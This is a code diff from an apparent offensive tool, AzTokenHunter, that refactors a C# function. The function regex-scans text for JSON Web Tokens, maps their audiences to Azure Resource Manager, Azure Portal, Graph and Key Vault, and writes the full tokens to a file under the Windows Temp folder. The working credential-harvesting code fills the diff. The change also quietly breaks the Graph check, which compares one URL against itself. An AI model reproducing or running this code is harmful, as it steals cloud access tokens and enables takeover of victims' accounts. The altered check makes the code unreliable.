@@ -96,63 +96,64 @@ namespace AzTokenHunter
             }
         }
         
-        public static void FindValidJWTs(string input)
-        {
-            string pattern = @"\beyJ0[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+[=]?\b";
-            string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
-            Regex regex = new Regex(pattern);
-            MatchCollection matches = regex.Matches(input);
-            foreach (Match match in matches)
-            {
-                try
-                {
-                    var jwtToken = new JwtSecurityToken(match.Value);
-                    foreach (String s in jwtToken.Audiences)
-                    {
-                        if(isKnownToken(s))
-                        {
-                            //Console.WriteLine(String.Format("[+] Found Token {0}: {1}", s, match.Value));
-                            Console.WriteLine(String.Format("[+] Found Token {0} - {1}", s, jwtToken.Payload.Iss));
-                            String tokenPath = String.Format("{0}\\Temp\\token.out", systemRoot);
-                            using (StreamWriter sw = File.AppendText(tokenPath)) {
-                                sw.WriteLine("{0} - {1} - {2}", s, jwtToken.Payload.Iss, match.Value);
-                            }
-                        }
-                    }
-                }
-                catch (Exception e) 
-                { 
-                
-                }
-            }
-        }
+	public static void FindValidJWTs(string input)
+	{
+		string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
+		String tokenPath = String.Format("{0}\\Temp\\token.out", systemRoot);
 
-        //To-do: Add other known microsoft audiences, return string and use said string to tag recovered access tokens
-	public static bool isKnownToken(string audience) 
+		string pattern = @"\beyJ0[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+[=]?\b";
+		Regex regex = new Regex(pattern);
+		MatchCollection matches = regex.Matches(input);
+
+		foreach (Match match in matches)
+		{
+			try
+			{
+				var jwtToken = new JwtSecurityToken(match.Value);
+				foreach (String s in jwtToken.Audiences)
+				{
+					string source = audienceToAPI(s);
+					if(source.Length > 0)
+					{
+						Console.WriteLine(String.Format("[+] Found Token: {0} - {1}", source, s));
+						using (StreamWriter sw = File.AppendText(tokenPath)) {
+							sw.WriteLine("{0} - {1} - {2}", source, s, match.Value);
+						}
+					}
+				}
+			}
+			catch (Exception e) 
+			{ 
+				
+			}
+		}
+	}
+
+	public static string audienceToAPI(string audience) 
 	{
 		audience = audience.TrimEnd('/');
 
 		// Azure resource manager token
 		if (audience.Equals("https://management.core.windows.net"))
 		{
-			return true;
+			return "Azure Resource Manager";
+
 		}
-		// Azure portal token 
-            	// https://seb8iaan.com/default-azuread-enterprise-applications-explained-where-do-they-come-from/
+		// Azure portal token https://seb8iaan.com/default-azuread-enterprise-applications-explained-where-do-they-come-from/
 		else if (audience.Equals("c44b4083-3bb0-49c1-b47d-974e53cbdf3c"))
 		{
-			return true;
+			return "Azure Portal";
 		}
 		// Microsoft graph API
-		else if (audience.Equals("https://graph.microsoft.com") || audience.Equals("https://graph.windows.net"))
+		else if (audience.Equals("https://graph.windows.net") || audience.Equals("https://graph.windows.net"))
 		{
-			return true;
+			return "Microsoft Graph API";
 		}
 		// Microsoft vault API
 		else if (audience.Equals("https://vault.azure.net")) {
-			return true;
+			return "Vault";
 		}
-		return false;
+		return "";
 	}
 
         static void Main(string[] args)
